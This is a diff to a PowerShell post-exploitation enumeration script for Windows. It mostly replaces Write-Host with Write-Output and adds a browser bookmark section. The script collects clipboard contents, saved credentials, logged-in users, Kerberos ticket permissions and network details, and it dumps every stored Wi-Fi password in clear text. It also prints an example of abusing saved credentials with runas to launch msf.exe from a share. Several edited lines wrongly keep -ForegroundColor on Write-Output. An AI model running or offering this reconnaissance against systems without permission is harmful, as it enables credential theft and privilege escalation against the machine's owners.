@@ -70,7 +70,7 @@ BEGIN
         Try
         {
 
-            Write-Host (($sid).Translate([System.Security.Principal.NTAccount]))
+            Write-Output (($sid).Translate([System.Security.Principal.NTAccount]))
 
         }  # End Try
         Catch
@@ -95,7 +95,7 @@ BEGIN
     BEGIN
     {
 
-        Write-Host "Retrieving driver signing information …" -ForegroundColor "Cyan"
+        Write-Output "Retrieving driver signing information …" -ForegroundColor "Cyan"
 
     } # End of Begin section
     PROCESS
@@ -195,10 +195,10 @@ PROCESS
 #================================================================
 #  SECURITY PATCHES
 #================================================================
-    Write-Host "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| OPERATING SYSTEM INFORMATION |`n=================================" 
     Get-CimInstance -ClassName "Win32_OperatingSystem" | Select-Object -Property Name,Caption,Description,CSName,Version,BuildNumber,OSArchitecture,SerialNumber,RegisteredUser
 
-    Write-Host "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| HOTFIXES INSTALLED ON DEVICE |`n=================================" 
     Try
     {
 
@@ -215,7 +215,7 @@ PROCESS
 #===================================================================
 #  NETWORK SHARES AND DRIVES
 #===================================================================
-Write-Host "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" -ForegroundColor "Yellow"
+Write-Output "=================================`n|  NEWORK SHARE DRIVES  |`n=================================" 
 Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSystem" } | Format-Table -AutoSize
 
 
@@ -234,66 +234,66 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 #==========================================================================
 #  ANTIVIRUS APPLICATION INFORMATION
 #==========================================================================
-    Write-Host "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|    ANTI-VIRUS INFORMATION    |`n=================================" 
 
     Get-AntiVirusProduct
 
 #==========================================================================
 #  USER, USER PRIVILEDGES, AND GROUP INFO
 #==========================================================================
-    Write-Host "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  LOCAL ADMIN GROUP MEMBERS  |`n=================================" 
     Get-LocalGroupMember -Group "Administrators" | Format-Table -Property "Name","PrincipalSource"
 
-    Write-Host "=================================`n|       USER & GROUP LIST       |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|       USER & GROUP LIST       |`n=================================" 
     Get-CimInstance -ClassName "Win32_UserAccount" | Format-Table -AutoSize
     Get-LocalGroup | Format-Table -Property "Name"
 
-    Write-Host "=================================`n|  CURRENT USER PRIVS   |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  CURRENT USER PRIVS   |`n=================================" 
     whoami /priv
 
-    Write-Host "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| USERS WHO HAVE HOME DIRS |`n=================================" 
     Get-ChildItem -Path C:\Users | Select-Object -Property "Name"
 
-    Write-Host "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  CLIPBOARD CONTENTS  |`n=================================" 
     Get-Clipboard
 
-    Write-Host "=================================`n|  SAVED CREDENTIALS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  SAVED CREDENTIALS  |`n=================================" 
     cmdkey /list
-    Write-Host "If you find a saved credential it can be used issuing a command in the below format: "
-    Write-Host 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
+    Write-Output "If you find a saved credential it can be used issuing a command in the below format: "
+    Write-Output 'runas /savecred /user:WORKGROUP\Administrator "\\###.###.###.###\FileShare\msf.exe"'
 
-    Write-Host "=================================`n|  SIGNED IN USERS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  SIGNED IN USERS  |`n=================================" 
     qwinsta
 
 
-    Write-Host "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" -ForegroundColor "Yellow"
+    Write-Output "=========================================`n|  CURRENT KERBEROS TICKET PERMISSIONS  |`n=========================================" 
     Show-KerberosTokenPermissions
 
 #==========================================================================
 #  NETWORK INFORMATION
 #==========================================================================
-    Write-Host "=================================`n|   LISTENING PORTS   |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|   LISTENING PORTS   |`n=================================" 
     Get-NetTcpConnection -State "Listen" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  ESTABLISHED CONNECTIONS  |`n=================================" 
     Get-NetTcpConnection -State "Established" | Sort-Object -Property "LocalPort" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  DNS SERVERS  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  DNS SERVERS  |`n=================================" 
     Get-DnsClientServerAddress -AddressFamily "IPv4" | Select-Object -Property "InterfaceAlias","ServerAddresses" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  ROUTING TABLE  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  ROUTING TABLE  |`n=================================" 
     Get-NetRoute | Select-Object -Property "DestinationPrefix","NextHop","RouteMetric" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|    ARP NEIGHBOR TABLE    |`n=================================" 
     Get-NetNeighbor | Select-Object -Property "IPAddress","LinkLayerAddress","State" | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  Wi-Fi Passwords  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  Wi-Fi Passwords  |`n=================================" 
     (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
 
 #==========================================================================
 #  APPLICATION INFO
 #==========================================================================
-    Write-Host "=================================`n| INSTALLED APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| INSTALLED APPLICATIONS |`n=================================" 
 
     $Paths = 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\','HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\'
 
@@ -304,14 +304,14 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 
     }  # End ForEach
 
-    Write-Host "=================================`n| STARTUP APPLICATIONS |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n| STARTUP APPLICATIONS |`n=================================" 
     Get-CimInstance -ClassName "Win32_StartupCommand" | Select-Object -Property "Name","Command","Location","User" | Format-Table -AutoSize
 
     $StartupAppCurrentUser = (Get-ChildItem -Path "C:\Users\$env:USERNAME\Start Menu\Programs\Startup" | Select-Object -ExpandProperty "Name" | Out-String).Trim()
     If ($StartupAppCurrentUser)
     {
 
-        Write-Host "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"
+        Write-Output "$StartupAppCurrentUser automatically starts for $env:USERNAME" -ForegroundColor "Cyan"
 
     }  # End If
 
@@ -319,11 +319,11 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
     If ($StartupAppAllUsers)
     {
 
-        Write-Host "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"
+        Write-Output "$StartupAppAllUsers automatically starts for All Users" -ForegroundColor "Cyan"
 
     }  # End If
 
-    Write-Host "Check below values for binaries you may be able to execute as another user."
+    Write-Output "Check below values for binaries you may be able to execute as another user."
     Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
     Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
     Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
@@ -333,11 +333,25 @@ Get-PSDrive | Where-Object { $_.Provider -like "Microsoft.PowerShell.Core\FileSy
 #==========================================================================
 #  PROCESS AND SERVICE ENUMERATION
 #==========================================================================
-    Write-Host "=================================`n|  PROCESS ENUMERATION  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  PROCESS ENUMERATION  |`n=================================" 
     Get-WmiObject -Query "Select * from Win32_Process" | Where-Object { $_.Name -notlike "svchost*" } | Select-Object -Property "Name","Handle",@{Label="Owner";Expression={$_.GetOwner().User}} | Format-Table -AutoSize
 
-    Write-Host "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" -ForegroundColor "Yellow"
+    Write-Output "=================================`n|  ENVIRONMENT VARIABLES  |`n=================================" 
     Get-ChildItem -Path "Env:" | Format-Table -Property "Key","Value"
+
+
+#==========================================================================
+# BROWSER INFO
+#==========================================================================
+    Write-Output "================================`n| BROWSER INFO |`n==================================="
+    Get-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\Main\" -Name "start page" | Select-Object -Property "Start Page"
+
+    $Bookmarks = [Environment]::GetFolderPath('Favorites')
+    Get-ChildItem -Path $BookMarks -Recurse -Include "*.url" | ForEach-Object {
+        
+        Get-Content $_.FullName | Select-String -Pattern URL
+        
+    }  # End ForEach-Object
 
 }  # End PROCESS
 
